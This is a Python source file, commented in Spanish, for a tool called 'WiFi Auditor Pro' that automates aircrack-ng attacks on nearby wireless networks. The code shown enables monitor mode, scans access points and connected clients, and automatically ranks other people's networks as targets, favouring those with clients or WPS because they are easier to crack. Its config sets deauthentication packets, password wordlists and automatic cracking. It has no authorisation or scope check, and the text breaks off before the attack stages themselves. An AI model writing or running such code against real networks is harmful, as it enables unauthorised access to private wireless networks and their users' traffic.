#!/usr/bin/env python3
"""
WiFi Auditor Pro - Script mejorado de auditoría de redes inalámbricas
Desarrollado para auditoría de seguridad profesional
Autor: Nicolas - Auditor de Seguridad
Versión: 2.0
"""

import os
import subprocess
import time
import signal
import re
import json
from datetime import datetime
from pathlib import Path
import argparse
import sys
import threading
import re
import random
import itertools

class Colors:
    """Colores para la salida del terminal"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class ProgressBar:
    """Barra de progreso profesional para mostrar avance en tiempo real"""
    
    def __init__(self, total, prefix='', suffix='', length=50):
        self.total = total
        self.prefix = prefix
        self.suffix = suffix
        self.length = length
        self.current = 0
        self.start_time = time.time()
        self._last_update = 0
        
    def update(self, current, custom_suffix=None):
        """Actualizar la barra de progreso"""
        self.current = current
        
        # Evitar actualizaciones muy frecuentes
        if time.time() - self._last_update < 0.1 and current != self.total:
            return
            
        percent = min(100.0 * current / self.total, 100.0)
        filled_length = int(self.length * current // self.total)
        bar = '█' * filled_length + '▒' * (self.length - filled_length)
        
        # Calcular tiempo estimado
        elapsed = time.time() - self.start_time
        if current > 0 and current < self.total:
            eta = elapsed * (self.total - current) / current
            eta_str = f"ETA: {int(eta//60)}:{int(eta%60):02d}"
        elif current >= self.total:
            total_time = elapsed
            eta_str = f"Tiempo: {int(total_time//60)}:{int(total_time%60):02d}"
        else:
            eta_str = "ETA: --:--"
            
        suffix = custom_suffix if custom_suffix else self.suffix
        
        # Limpiar línea y mostrar progreso
        sys.stdout.write('\r\033[K')  # Limpiar línea
        sys.stdout.write(f'{Colors.CYAN}{self.prefix}{Colors.END} |{Colors.GREEN}{bar}{Colors.END}| '
                        f'{Colors.BOLD}{percent:5.1f}%{Colors.END} {suffix} {Colors.YELLOW}({eta_str}){Colors.END}')
        sys.stdout.flush()
        
        self._last_update = time.time()
        
    def finish(self, success_message="Completado"):
        """Terminar la barra de progreso"""
        self.update(self.total, success_message)
        print()  # Nueva línea
        
    def increment(self, amount=1, custom_suffix=None):
        """Incrementar el progreso"""
        self.update(self.current + amount, custom_suffix)

class WiFiAuditor:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.targets = []
        self.handshake_dir = Path("handshakes")
        self.wordlist_dir = Path("wordlists")
        self.config_file = Path("wifi_auditor_config.json")
        self.session_log = Path(f"audit_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
        self.cracked_networks = []
        self.running = True
        
        # Crear directorios necesarios
        self.handshake_dir.mkdir(exist_ok=True)
        self.wordlist_dir.mkdir(exist_ok=True)
        
        # Cargar configuración
        self.load_config()
        
        # Configurar manejo de señales
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Guardar estado original del sistema para restauración
        self._save_original_state()

    def load_config(self):
        """Cargar configuración desde archivo JSON"""
        default_config = {
            "handshake_timeout": 60,
            "deauth_packets": 10,
            "scan_time": 30,
            "wordlists": [
                "rockyou.txt",
                "darkweb2017-top10000.txt",
                "common_passwords.txt"
            ],
            "excluded_networks": [],
            "target_encryption": ["WPA", "WPA2", "WPS"],
            "min_signal_strength": -70,
            "auto_crack": True,
            "verbose": True
        }
        
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    self.config = {**default_config, **json.load(f)}
            except:
                self.config = default_config
        else:
            self.config = default_config
            self.save_config()

    def save_config(self):
        """Guardar configuración actual"""
        with open(self.config_file, 'w') as f:
            json.dump(self.config, f, indent=4)

    def safe_input(self, prompt, default=None, allow_empty=False):
        """Entrada segura de usuario con manejo robusto de EOF y KeyboardInterrupt"""
        import sys
        
        # Verificar si estamos en un entorno interactivo
        if not sys.stdin.isatty():
            if default is not None:
                self.log(f"Entorno no interactivo - usando valor por defecto: {default}", "WARNING")
                return default
            else:
                self.log("Entorno no interactivo sin valor por defecto - cancelando", "ERROR")
                raise EOFError("No hay entrada disponible")
        
        try:
            result = input(prompt).strip()
            
            # Si la entrada está vacía y no se permiten entradas vacías
            if not result and not allow_empty and default is not None:
                self.log(f"Entrada vacía - usando valor por defecto: {default}", "INFO")
                return default
            
            return result
            
        except EOFError:
            if default is not None:
                self.log("EOF detectado - usando valor por defecto", "WARNING")
                return default
            else:
                self.log("EOF detectado sin valor por defecto - cancelando operación", "ERROR")
                raise EOFError("Entrada terminada inesperadamente")
                
        except KeyboardInterrupt:
            self.log("Entrada cancelada por usuario (Ctrl+C)", "WARNING")
            raise KeyboardInterrupt("Usuario canceló la operación")
    
    def robust_input(self, prompt, max_attempts=3):
        """Entrada ultra robusta que intenta diferentes métodos"""
        import sys
        
        for attempt in range(max_attempts):
            try:
                self.log(f"Intento {attempt + 1}/{max_attempts} de entrada interactiva", "INFO")
                
                # Método 1: input() estándar con flush forzado
                sys.stdout.write(prompt)
                sys.stdout.flush()
                
                try:
                    result = input().strip()
                    if result:  # Si obtenemos algo, devolver inmediatamente
                        return result
                    else:
                        self.log("Entrada vacía, solicitando nuevamente...", "WARNING")
                        continue
                        
                except EOFError:
                    self.log(f"EOF en intento {attempt + 1}", "WARNING")
                    if attempt < max_attempts - 1:
                        continue
                    else:
                        raise EOFError("No se pudo obtener entrada después de varios intentos")
                
            except KeyboardInterrupt:
                self.log("Entrada cancelada por usuario", "WARNING")
                raise
            except Exception as e:
                self.log(f"Error en intento {attempt + 1}: {e}", "ERROR")
                if attempt == max_attempts - 1:
                    raise
        
        raise EOFError("No se pudo obtener entrada después de todos los intentos")
    
    def automatic_fallback_selection(self):
        """Selección automática cuando no hay entrada interactiva disponible"""
        self.log("=== MODO AUTOMÁTICO ACTIVADO (Fallback) ===", "WARNING")
        
        # Prioridad 1: Redes con clientes (más fáciles)
        clients_targets = [t for t in self.targets if t['clients'] > 0]
        if clients_targets:
            # Ordenar por número de clientes y señal
            selected = sorted(clients_targets, key=lambda x: (-x['clients'], -x['power']))[:5]
            self.log(f"✨ Selección automática: {len(selected)} redes con clientes", "SUCCESS")
            
            print(f"\n{Colors.GREEN}✅ Seleccionadas automáticamente (redes con clientes):{Colors.END}")
            for i, target in enumerate(selected, 1):
                print(f"  {i}. {target['essid']} (👥{target['clients']} clientes, {target['power']}dBm)")
            
            return selected
        
        # Prioridad 2: Redes con WPS (más fáciles de romper)
        wps_targets = [t for t in self.targets if 'WPS' in t['encryption']]
        if wps_targets:
            selected = sorted(wps_targets, key=lambda x: -x['power'])[:3]
            self.log(f"⚡ Selección automática: {len(selected)} redes con WPS", "SUCCESS")
            
            print(f"\n{Colors.PURPLE}✅ Seleccionadas automáticamente (redes WPS):{Colors.END}")
            for i, target in enumerate(selected, 1):
                print(f"  {i}. {target['essid']} (WPS, {target['power']}dBm)")
            
            return selected
        
        # Prioridad 3: Mejores señales (modo experto)
        best_signal = sorted(self.targets, key=lambda x: -x['power'])[:3]
        self.log(f"📡 Selección automática: {len(best_signal)} redes con mejor señal", "INFO")
        
        print(f"\n{Colors.YELLOW}✅ Seleccionadas automáticamente (mejor señal):{Colors.END}")
        for i, target in enumerate(best_signal, 1):
            print(f"  {i}. {target['essid']} ({target['power']}dBm)")
        
        return best_signal
    
    def log(self, message, level="INFO"):
        """Logging mejorado con timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] [{level}] {message}"
        
        if level == "ERROR":
            print(f"{Colors.RED}{log_message}{Colors.END}")
        elif level == "SUCCESS":
            print(f"{Colors.GREEN}{log_message}{Colors.END}")
        elif level == "WARNING":
            print(f"{Colors.YELLOW}{log_message}{Colors.END}")
        elif level == "INFO":
            print(f"{Colors.CYAN}{log_message}{Colors.END}")
        
        # Escribir al archivo de log
        with open(self.session_log, 'a') as f:
            f.write(log_message + '\n')

    def signal_handler(self, signum, frame):
        """Manejo de señales para limpieza"""
        self.log("Recibida señal de interrupción, limpiando...", "WARNING")
        self.running = False
        self.cleanup()
        sys.exit(0)

    def run_command(self, command, capture_output=True, timeout=None):
        """Ejecutar comando con mejor manejo de errores y control de procesos"""
        import signal
        import psutil
        
        # Timeout por defecto de 30 segundos para comandos interactivos
        if timeout is None and any(cmd in command for cmd in ['aircrack-ng', 'airodump-ng', 'aireplay-ng']):
            timeout = 30
        
        process = None
        try:
            if capture_output:
                process = subprocess.Popen(
                    command, shell=True, stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid
                )
                
                # Esperar con timeout
                try:
                    stdout, stderr = process.communicate(timeout=timeout)
                    return process.returncode == 0, stdout, stderr
                except subprocess.TimeoutExpired:
                    self.log(f"Comando expirado, terminando proceso: {command[:50]}...", "WARNING")
                    # Terminar grupo de procesos completo
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                        process.wait(timeout=5)
                    except:
                        try:
                            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                        except:
                            pass
                    return False, "", "Timeout"
            else:
                process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
                try:
                    process.wait(timeout=timeout)
                    return process.returncode == 0, "", ""
                except subprocess.TimeoutExpired:
                    self.log(f"Comando sin captura expirado: {command[:50]}...", "WARNING")
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                        process.wait(timeout=5)
                    except:
                        try:
                            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                        except:
                            pass
                    return False, "", "Timeout"
                    
        except Exception as e:
            self.log(f"Error ejecutando comando: {e}", "ERROR")
            if process:
                try:
                    os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                except:
                    pass
            return False, "", str(e)

    def check_root(self):
        """Verificar permisos de root"""
        if os.geteuid() != 0:
            self.log("Este script requiere permisos de administrador", "ERROR")
            sys.exit(1)

    def check_dependencies(self):
        """Verificar dependencias necesarias"""
        # Verificar herramientas esenciales con rutas completas
        essential_tools = {
            'aircrack-ng': ['/usr/bin/aircrack-ng', '/usr/sbin/aircrack-ng'],
            'airmon-ng': ['/usr/bin/airmon-ng', '/usr/sbin/airmon-ng'],
            'airodump-ng': ['/usr/bin/airodump-ng', '/usr/sbin/airodump-ng'],
            'aireplay-ng': ['/usr/bin/aireplay-ng', '/usr/sbin/aireplay-ng'],
            'iwconfig': ['/usr/sbin/iwconfig', '/sbin/iwconfig'],
            'iw': ['/usr/sbin/iw', '/sbin/iw']
        }
        
        missing = []
        found_paths = {}
        
        for tool, possible_paths in essential_tools.items():
            tool_found = False
            for path in possible_paths:
                if os.path.exists(path):
                    found_paths[tool] = path
                    tool_found = True
                    break
            
            if not tool_found:
                # Intento final con which
                success, output, _ = self.run_command(f"which {tool} 2>/dev/null")
                if success and output.strip():
                    found_paths[tool] = output.strip()
                    tool_found = True
            
            if not tool_found:
                missing.append(tool)
        
        # Actualizar las rutas en el sistema
        if found_paths:
            self.tool_paths = found_paths
            self.log(f"Herramientas encontradas: {list(found_paths.keys())}", "SUCCESS")
        
        if missing:
            self.log(f"Dependencias faltantes: {', '.join(missing)}", "ERROR")
            self.log("Ejecuta: sudo apt install aircrack-ng wireless-tools iw", "ERROR")
            return False
        
        self.log("Todas las dependencias están disponibles", "SUCCESS")
        return True

    def get_interfaces(self):
        """Obtener interfaces de red WiFi disponibles con detección mejorada"""
        interfaces = []
        
        self.log("Detectando interfaces WiFi...", "INFO")
        
        # Método 1: Verificación en /sys/class/net (más confiable)
        try:
            import os
            self.log("Método 1: Escaneando /sys/class/net/", "INFO")
            for iface in os.listdir('/sys/class/net/'):
                wireless_path = f'/sys/class/net/{iface}/wireless'
                if os.path.exists(wireless_path):
                    if iface not in interfaces:
                        interfaces.append(iface)
                        self.log(f"Interfaz WiFi encontrada: {iface}", "SUCCESS")
        except Exception as e:
            self.log(f"Error en método 1: {e}", "WARNING")
        
        # Método 2: iw dev (moderno y confiable)
        self.log("Método 2: Verificando con iw dev", "INFO")
        iw_path = getattr(self, 'tool_paths', {}).get('iw', '/usr/sbin/iw')
        success, output, _ = self.run_command(f"{iw_path} dev 2>/dev/null")
        if success:
            current_interface = None
            for line in output.split('\n'):
                line = line.strip()
                if line.startswith('Interface '):
                    current_interface = line.split()[1]
                elif line.startswith('type ') and current_interface:
                    if 'managed' in line.lower() or 'monitor' in line.lower():
                        if current_interface not in interfaces:
                            interfaces.append(current_interface)
                            self.log(f"Interfaz WiFi confirmada: {current_interface}", "SUCCESS")
                    current_interface = None
        
        # Método 3: iwconfig (respaldo legacy)
        if not interfaces:
            self.log("Método 3: Intentando con iwconfig como respaldo", "WARNING")
            iwconfig_path = getattr(self, 'tool_paths', {}).get('iwconfig', '/usr/sbin/iwconfig')
            success, output, _ = self.run_command(f"{iwconfig_path} 2>/dev/null")
            if success:
                for line in output.split('\n'):
                    if 'IEEE 802.11' in line or ('ESSID:' in line and 'no wireless' not in line.lower()):
                        parts = line.split()
                        if parts:
                            interface = parts[0]
                            if interface and interface not in interfaces:
                                interfaces.append(interface)
                                self.log(f"Interfaz WiFi detectada (iwconfig): {interface}", "INFO")
        
        # Método 4: Búsqueda por patrones comunes si no hay interfaces
        if not interfaces:
            self.log("Método 4: Buscando por patrones comunes de nomenclatura", "WARNING")
            success, output, _ = self.run_command("ip link show")
            if success:
                import re
                # Buscar interfaces con patrones WiFi comunes
                wifi_patterns = [r'wlan\d+', r'wlp\d+s\d+', r'wlx[a-f0-9]+', r'wifi\d+']
                for pattern in wifi_patterns:
                    matches = re.findall(f'\d+: ({pattern}):', output)
                    for match in matches:
                        if match not in interfaces:
                            # Verificar que es realmente WiFi
                            iw_path = getattr(self, 'tool_paths', {}).get('iw', '/usr/sbin/iw')
                            check_success, _, _ = self.run_command(f"{iw_path} dev {match} info 2>/dev/null")
                            if check_success:
                                interfaces.append(match)
                                self.log(f"Interfaz WiFi encontrada por patrón: {match}", "SUCCESS")
        
        # Filtrar y verificar interfaces válidas
        valid_interfaces = []
        for iface in interfaces:
            self.log(f"Validando interfaz: {iface}", "INFO")
            
            # Verificación múltiple
            iw_path = getattr(self, 'tool_paths', {}).get('iw', '/usr/sbin/iw')
            iwconfig_path = getattr(self, 'tool_paths', {}).get('iwconfig', '/usr/sbin/iwconfig')
            checks = [
                f"{iw_path} dev {iface} info",
                f"{iwconfig_path} {iface}",
                f"ip link show {iface}"
            ]
            
            valid = False
            for check in checks:
                success, output, _ = self.run_command(f"{check} 2>/dev/null")
                if success and ('wireless' in output.lower() or 'wifi' in output.lower() or 'ieee 802.11' in output.lower()):
                    valid = True
                    break
            
            if valid:
                valid_interfaces.append(iface)
                self.log(f"Interfaz {iface} validada correctamente", "SUCCESS")
            else:
                self.log(f"Interfaz {iface} no es válida para WiFi", "WARNING")
        
        self.log(f"Total de interfaces WiFi encontradas: {len(valid_interfaces)}", "INFO")
        return valid_interfaces

    def select_interface(self):
        """Seleccionar interfaz de red automáticamente o manualmente"""
        interfaces = self.get_interfaces()
        
        if not interfaces:
            self.log("No se encontraron interfaces WiFi", "ERROR")
            return False
        
        if len(interfaces) == 1:
            self.interface = interfaces[0]
            self.log(f"Interface seleccionada automáticamente: {self.interface}", "INFO")
        else:
            print(f"\n{Colors.BOLD}Interfaces WiFi disponibles:{Colors.END}")
            for i, iface in enumerate(interfaces, 1):
                print(f"{i}. {iface}")
            
            try:
                choice_str = self.safe_input(
                    "\nSelecciona una interfaz (número): ",
                    default="1",  # Seleccionar primera interfaz por defecto
                    allow_empty=False
                )
                if not choice_str:
                    self.log("Selección cancelada", "WARNING")
                    return False
                choice = int(choice_str) - 1
                self.interface = interfaces[choice]
                self.log(f"Interface seleccionada: {self.interface}", "INFO")
            except (ValueError, IndexError, KeyboardInterrupt):
                self.log("Selección inválida o cancelada", "ERROR")
                return False
        
        return True

    def enable_monitor_mode(self):
        """Habilitar modo monitor con verificaciones mejoradas"""
        if not self.interface:
            self.log("No hay interfaz seleccionada", "ERROR")
            return False
        
        self.log(f"Habilitando modo monitor en {self.interface}...", "INFO")
        
        # Verificar si ya está en modo monitor  
        iwconfig_path = getattr(self, 'tool_paths', {}).get('iwconfig', '/usr/sbin/iwconfig')
        success, output, _ = self.run_command(f"{iwconfig_path} {self.interface} 2>/dev/null")
        if success and "Mode:Monitor" in output:
            self.log(f"{self.interface} ya está en modo monitor", "INFO")
            self.monitor_interface = self.interface
            return True
        
        # NO matar NetworkManager agresivamente - causa problemas de conectividad
        # Solo detener wpa_supplicant temporalmente si es necesario
        self.log("Preparando interfaz para modo monitor...", "INFO")
        self.run_command(f"timeout 5 pkill -f wpa_supplicant", capture_output=False)
        time.sleep(1)
        
        # Verificar si la interfaz está siendo usada
        success, output, _ = self.run_command(f"lsof /dev/{self.interface} 2>/dev/null")
        if success and output.strip():
            self.log(f"Interfaz {self.interface} en uso, intentando liberar...", "WARNING")
            # Forzar down de la interfaz
            self.run_command(f"ip link set {self.interface} down")
            time.sleep(2)
        
        # Verificar que airmon-ng puede manejar la interfaz
        airmon_path = getattr(self, 'tool_paths', {}).get('airmon-ng', '/usr/sbin/airmon-ng')
        success, output, _ = self.run_command(f"{airmon_path} 2>/dev/null")
        if not success or self.interface not in output:
            self.log(f"airmon-ng no puede manejar la interfaz {self.interface}", "WARNING")
            # Intentar con método alternativo directamente
            return self._enable_monitor_alternative()
        
        # Habilitar modo monitor con airmon-ng
        self.log(f"Ejecutando airmon-ng start {self.interface}...", "INFO")
        success, output, error = self.run_command(f"{airmon_path} start {self.interface}")
        if not success:
            self.log(f"Error habilitando modo monitor: {error}", "ERROR")
            # Intentar método alternativo con iw
            return self._enable_monitor_alternative()
        
        self.log(f"Salida de airmon-ng: {output[:200]}...", "INFO")
        
        # Obtener el nombre de la interfaz en modo monitor
        monitor_interfaces = []
        iwconfig_path = getattr(self, 'tool_paths', {}).get('iwconfig', '/usr/sbin/iwconfig')
        success, output, _ = self.run_command(f"{iwconfig_path} 2>/dev/null")
        
        # Buscar interfaces en modo monitor
        for line in output.split('\n'):
            if 'Mode:Monitor' in line:
                monitor_interfaces.append(line.split()[0])
        
        # Si no encontramos con iwconfig, buscar con iw dev (para drivers modernos como iwlwifi)
        if not monitor_interfaces:
            iw_path = getattr(self, 'tool_paths', {}).get('iw', '/usr/sbin/iw')
            success, iw_output, _ = self.run_command(f"{iw_path} dev 2>/dev/null")
            if success:
                current_interface = None
                for line in iw_output.split('\n'):
                    line = line.strip()
                    if line.startswith('Interface '):
                        current_interface = line.split()[1]
                    elif 'type monitor' in line.lower() and current_interface:
                        monitor_interfaces.append(current_interface)
                        current_interface = None
        
        # Intel iwlwifi: a veces crea wlp2s0mon pero no aparece inmediatamente
        if not monitor_interfaces:
            # Verificar interfaces con patrón *mon
            success, ip_output, _ = self.run_command("ip link show")
            if success:
                import re
                mon_interfaces = re.findall(r'\d+: (\w+mon):', ip_output)
                if mon_interfaces:
                    monitor_interfaces.extend(mon_interfaces)
                    self.log(f"Interfaces monitor encontradas con ip link: {mon_interfaces}", "INFO")
        
        if monitor_interfaces:
            self.monitor_interface = monitor_interfaces[0]
            self.log(f"Modo monitor habilitado: {self.monitor_interface}", "SUCCESS")
            
            # Para Intel iwlwifi, verificar que la interfaz monitor esté UP
            self.run_command(f"ip link set {self.monitor_interface} up 2>/dev/null")
            return True
        else:
            # Último intento: usar la interfaz original si airmon-ng dijo que funcionó
            if "monitor mode vif enabled" in output:
                self.monitor_interface = self.interface + "mon"
                self.log(f"Usando interfaz monitor inferida: {self.monitor_interface}", "WARNING")
                self.run_command(f"ip link set {self.monitor_interface} up 2>/dev/null")
                return True
            
            self.log("No se pudo obtener interfaz en modo monitor", "ERROR")
            return False

    def scan_networks(self, scan_time=None):
        """Escanear redes WiFi disponibles Y clientes en un solo paso como Wifite"""
        if not self.monitor_interface:
            self.log("No hay interfaz en modo monitor disponible", "ERROR")
            return False
        
        scan_time = scan_time or self.config.get('scan_time', 30)
        
        # Pre-verificación: ver si hay redes cerca usando iw scan (modo managed)
        self.log("Verificando que hay redes WiFi en el área...", "INFO")
        if hasattr(self, 'interface') and self.interface:
            iw_path = getattr(self, 'tool_paths', {}).get('iw', '/usr/sbin/iw')
            success, output, _ = self.run_command(f"{iw_path} dev {self.interface} scan 2>/dev/null | grep SSID | head -5", timeout=10)
            if success and output.strip():
                networks_found = len(output.strip().split('\n'))
                self.log(f"Pre-escaneo detectó ~{networks_found} redes en el área", "SUCCESS")
            else:
                self.log("Pre-escaneo: pocas o ninguna red detectada en el área", "WARNING")
        
        self.log(f"Escaneando redes y clientes por {scan_time} segundos...", "INFO")
        
        # Archivo temporal para captura
        scan_file = f"scan_{int(time.time())}"
        
        # UN SOLO ESCANEO para redes y clientes (como Wifite)
        airodump_path = getattr(self, 'tool_paths', {}).get('airodump-ng', '/usr/sbin/airodump-ng')
        command = f"{airodump_path} {self.monitor_interface} -w {scan_file} --output-format csv"
        
        self.log(f"Ejecutando: {command}", "INFO")
        # Iniciar proceso
        process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Inicializar barra de progreso para el escaneo
        progress_bar = ProgressBar(
            total=scan_time,
            prefix="ESCANEO WiFi",
            suffix="Buscando redes y clientes...",
            length=40
        )
        
        # Esperar tiempo especificado con progreso visual
        for second in range(scan_time + 1):
            if not self.running:
                process.terminate()
                progress_bar.finish("Escaneo interrumpido")
                return False
                
            progress_bar.update(
                second,
                f"Escaneando... Tiempo restante: {scan_time - second}s"
            )
            time.sleep(1)
        
        progress_bar.finish("Escaneo completado")
        
        # Detener proceso
        process.terminate()
        time.sleep(2)
        
        # Leer resultados
        csv_file = f"{scan_file}-01.csv"
        if not os.path.exists(csv_file):
            self.log("No se pudo generar archivo de escaneo", "ERROR")
            # Verificar posibles archivos de escaneo alternativos
            alt_files = list(Path('.').glob(f"{scan_file}*.csv"))
            if alt_files:
                csv_file = str(alt_files[0])
                self.log(f"Usando archivo alternativo: {csv_file}", "INFO")
            else:
                self.log("Ningún archivo de escaneo fue generado - verifica que la interfaz esté en modo monitor", "ERROR")
                return False
        
        # Verificar que el archivo tiene contenido
        file_size = os.path.getsize(csv_file)
        if file_size < 100:  # Archivo muy pequeño
            self.log(f"Archivo de escaneo muy pequeño ({file_size} bytes) - posible problema de permisos o interfaz", "WARNING")
        else:
            self.log(f"Archivo de escaneo generado: {file_size} bytes", "SUCCESS")
        
        # DEBUG: Mostrar contenido del archivo para diagnosticar
        self.log(f"Analizando contenido del archivo {csv_file}...", "INFO")
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            lines = [line.strip() for line in content.split('\n') if line.strip()]
            self.log(f"Archivo tiene {len(lines)} líneas de contenido", "INFO")
            
            # Mostrar primeras líneas para debug
            if len(lines) > 0:
                self.log(f"Primera línea: {lines[0][:100]}...", "INFO")
            if len(lines) > 1:
                self.log(f"Segunda línea: {lines[1][:100]}...", "INFO")
                
        except Exception as e:
            self.log(f"Error leyendo archivo para debug: {e}", "WARNING")
        
        # Parsear redes Y clientes del mismo archivo
        self.targets = self.parse_airodump_csv_with_clients(csv_file)
        
        # Limpiar archivos temporales
        for file in Path('.').glob(f"{scan_file}*"):
            try:
                file.unlink()
            except:
                pass
        
        self.log(f"Encontradas {len(self.targets)} redes", "SUCCESS")
        return True


    def parse_airodump_csv_with_clients(self, csv_file):
        """Parsear archivo CSV de airodump-ng para redes Y clientes - ARREGLADO"""
        targets = []
        bssid_clients = {}
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Dividir en líneas y limpiar
            lines = [line.strip() for line in content.split('\n') if line.strip()]
            
            # Encontrar secciones con mejor detección
            ap_start = -1
            client_start = -1
            
            self.log(f"Buscando secciones en {len(lines)} líneas...", "INFO")
            for i, line in enumerate(lines):
                # Header de APs: debe tener BSSID como primera columna Y campos típicos de AP
                if line.startswith('BSSID') and 'ESSID' in line and 'channel' in line:
                    ap_start = i + 1
                    self.log(f"Sección AP encontrada en línea {i}: {line[:50]}...", "INFO")
                # Header de clientes: Station MAC es específico de clientes
                elif line.startswith('Station MAC') or ('Station MAC' in line and i > ap_start):
                    client_start = i + 1
                    self.log(f"Sección Cliente encontrada en línea {i}: {line[:50]}...", "INFO")
                    break
            
            # Procesar APs (redes)
            if ap_start > 0:
                self.log(f"Procesando APs desde línea {ap_start}...", "INFO")
                processed_aps = 0
                for i in range(ap_start, len(lines)):
                    # Parar cuando llegamos a la sección de clientes
                    if lines[i].startswith('Station MAC') or 'Station MAC' in lines[i][:20]:
                        self.log(f"Fin de sección AP en línea {i}: {lines[i][:50]}...", "INFO")
                        break
                    
                    line = lines[i]
                    if not line or line.startswith('#'):
                        continue
                    
                    # DEBUG: Mostrar línea que estamos procesando
                    if processed_aps < 3:  # Solo mostrar las primeras 3 para no saturar
                        self.log(f"Procesando AP línea {i}: {line[:80]}...", "INFO")
                    
                    parts = [p.strip() for p in line.split(',')]
                    self.log(f"Línea dividida en {len(parts)} partes", "INFO")
                    
                    if len(parts) >= 13:  # Más tolerante, requiere menos campos
                        try:
                            bssid = parts[0] if len(parts) > 0 else ''
                            channel = parts[3] if len(parts) > 3 else '1'
                            encryption = parts[5] if len(parts) > 5 else 'OPN'
                            power_str = parts[8] if len(parts) > 8 else '-100'
                            # ESSID puede estar en diferentes posiciones
                            essid = ''
                            for pos in [13, 14, 15, -1]:  # Probar diferentes posiciones
                                if pos < len(parts) and parts[pos].strip():
                                    essid = parts[pos].strip()
                                    break
                            
                            # Limpiar ESSID
                            if essid.startswith('"') and essid.endswith('"'):
                                essid = essid[1:-1]
                            
                            # Ser más permisivo con redes válidas
                            if bssid and len(bssid) >= 17:  # Al menos formato MAC básico
                                # Convertir power a entero
                                try:
                                    power_val = int(power_str) if power_str.lstrip('-').isdigit() else -100
                                except:
                                    power_val = -100
                                
                                # Si no hay ESSID, usar BSSID truncado como identificador
                                if not essid or essid == '' or essid == '<length:  0>':
                                    essid = f"Hidden_{bssid[-8:].replace(':', '')}"
                                
                                targets.append({
                                    'bssid': bssid,
                                    'essid': essid,
                                    'channel': channel,
                                    'encryption': encryption,
                                    'power': power_val,
                                    'clients': 0  # Se actualizará después
                                })
                                processed_aps += 1
                                
                                if processed_aps <= 3:
                                    self.log(f"AP procesado: {essid} ({bssid}) - {encryption}", "SUCCESS")
                                    
                        except Exception as e:
                            self.log(f"Error procesando línea {i}: {e}", "WARNING")
                            continue
                
                self.log(f"Total APs procesados: {processed_aps}", "INFO")
            
            # Procesar clientes
            if client_start > 0:
                for i in range(client_start, len(lines)):
                    line = lines[i]
                    if not line or line.startswith('#'):
                        continue
                    
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 6:
                        try:
                            client_mac = parts[0]
                            associated_bssid = parts[5]
                            
                            # Verificar que el cliente esté asociado a un AP
                            if (associated_bssid and 
                                associated_bssid != '(not associated)' and 
                                associated_bssid != '' and
                                len(associated_bssid) == 17):  # Formato MAC válido
                                
                                if associated_bssid not in bssid_clients:
                                    bssid_clients[associated_bssid] = set()
                                bssid_clients[associated_bssid].add(client_mac)
                        except:
                            continue
            
            # Actualizar contador de clientes
            for target in targets:
                bssid = target['bssid']
                if bssid in bssid_clients:
                    target['clients'] = len(bssid_clients[bssid])
                    if target['clients'] > 0:
                        self.log(f"  → {target['essid']}: {target['clients']} clientes conectados", "SUCCESS")
            
            # Contar cuántas redes tienen clientes
            networks_with_clients = sum(1 for t in targets if t['clients'] > 0)
            if networks_with_clients > 0:
                self.log(f"🎯 Encontradas {networks_with_clients} redes con clientes conectados!", "SUCCESS")
            else:
                self.log("No se detectaron clientes conectados a ninguna red", "WARNING")
        
        except Exception as e:
            self.log(f"Error parseando CSV: {e}", "ERROR")
        
        return targets

    def display_targets(self):
        """Mostrar objetivos encontrados con información detallada de clientes"""
        if not self.targets:
            self.log("No hay objetivos disponibles", "WARNING")
            return
        
        print(f"\n{Colors.BOLD}{Colors.UNDERLINE}Redes WiFi encontradas:{Colors.END}")
        print(f"{'#':<3} {'ESSID':<25} {'BSSID':<18} {'CH':<3} {'SEÑAL':<6} {'CLIENTES':<8} {'ENCRIPTACIÓN':<12}")
        print("-" * 85)
        
        # Ordenar por número de clientes (descendente) y luego por señal
        sorted_targets = sorted(self.targets, key=lambda x: (-x['clients'], -x['power']))
        
        for i, target in enumerate(sorted_targets, 1):
            # Color según número de clientes
            if target['clients'] > 0:
                color = Colors.GREEN
                client_text = f"🟢 {target['clients']}"
            else:
                color = Colors.YELLOW
                client_text = f"🔴 {target['clients']}"
            
            # Indicador de señal
            signal = target['power']
            if signal > -50:
                signal_icon = "🟢"  # Verde
            elif signal > -70:
                signal_icon = "🟡"  # Amarillo
            else:
                signal_icon = "🔴"  # Rojo
                
            print(f"{color}{i:<3} {target['essid']:<25} {target['bssid']:<18} "
                  f"{target['channel']:<3} {signal_icon}{signal}dBm{'':<1} {client_text:<8} {target['encryption']:<12}{Colors.END}")
        
        # Actualizar la lista de targets con el orden ordenado para que los índices coincidan
        self.targets = sorted_targets
        
        # Mostrar resumen de clientes
        total_clients = sum(t['clients'] for t in self.targets)
        networks_with_clients = sum(1 for t in self.targets if t['clients'] > 0)
        
        print(f"\n{Colors.BOLD}Resumen:{Colors.END}")
        print(f"📶 Total de redes: {len(self.targets)}")
        print(f"🟢 Redes con clientes: {networks_with_clients} ({total_clients} dispositivos total)")
        print(f"🔴 Redes sin clientes: {len(self.targets) - networks_with_clients}")
        
        if networks_with_clients > 0:
            print(f"\n{Colors.GREEN}✨ RECOMENDACIÓN: Las redes VERDES con clientes conectados tienen mayor probabilidad de éxito{Colors.END}")

    def select_targets(self, auto_mode=False):
